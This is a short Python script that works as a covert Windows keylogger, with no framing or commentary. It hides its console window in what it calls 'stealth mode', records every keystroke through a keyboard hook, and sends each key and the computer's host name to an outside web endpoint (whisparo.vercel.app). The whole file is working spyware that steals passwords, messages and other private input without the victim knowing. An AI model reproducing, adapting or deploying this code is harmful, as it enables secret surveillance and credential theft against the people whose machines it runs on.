import sys
import requests
from pynput import keyboard
import ctypes
import socket

pc_name = socket.gethostname()
ip = socket.gethostbyname(pc_name)

def get_caps_lock_status():
    hllDll = ctypes.WinDLL("User32.dll")
    VK_CAPITAL = 0x14
    return hllDll.GetKeyState(VK_CAPITAL) & 0x0001 != 0

def on_press(key):
    chars = {
        "Key.space": " ",
        "Key.enter": "<Enter>",
        "Key.tab": "  ",
        "Key.backspace": "<BACKSPACE>",
        "Key.delete": "<Del>",
        "Key.up": "<UP>",
        "Key.down": "<DOWN>",
        "Key.left": "<LEFT>",
        "Key.right": "<RIGHT>",
        "Key.esc": "<ESC>",
        "Key.caps_lock": "<CAPSLOCK>",
        "Key.print_screen": "<PRTSC>",
        "Key.insert": "<INS>",
        "Key.page_up": "<PGUP>",
        "Key.page_down": "<PGDN>",
        "Key.home": "<HOME>",
        "Key.end": "<END>",
        "Key.f1": "<F1>",
        "Key.f2": "<F2>",
        "Key.f3": "<F3>",
        "Key.f4": "<F4>",
        "Key.f5": "<F5>",
        "Key.f6": "<F6>",
        "Key.f7": "<F7>",
        "Key.f8": "<F8>",
        "Key.f9": "<F9>",
        "Key.f10": "<F10>",
        "Key.f11": "<F11>",
        "Key.f12": "<F12>"
    }
    banned_chars = [
        'Key.shift',
        'Key.ctrl',
        'Key.alt',
        'Key.cmd',
        'Key.cmd_r',
        'Key.ctrl_r',
        'Key.shift_r',
        'Key.alt_r',
        'Key.shift_l',
        'Key.ctrl_l',
        'Key.alt_l',
    ]
    try:
        if hasattr(key, 'char'):
            char = key.char
        else:
            char = str(key).replace("'", "")
            if char in chars:
                char = chars[char]
        
        if isinstance(char, int) and 65 <= char <= 90 and not key.ctrl:
            char = chr(char + 32)

        if get_caps_lock_status() and char.isalpha():
            char = char.upper()
        
        if str(key) not in banned_chars:
            api(str(char))
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return api("<ESC>")

def start_logging():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def api(k):
    url = f"https://whisparo.vercel.app/api/store-data?pc_name={pc_name}&ch={k}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            pass
        else:
            pass
    except requests.exceptions.RequestException as e:
        pass

def stealth_mode():
    if sys.platform.startswith("win"):
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def main():
    stealth_mode()
    start_logging()


if __name__ == "__main__":
    main()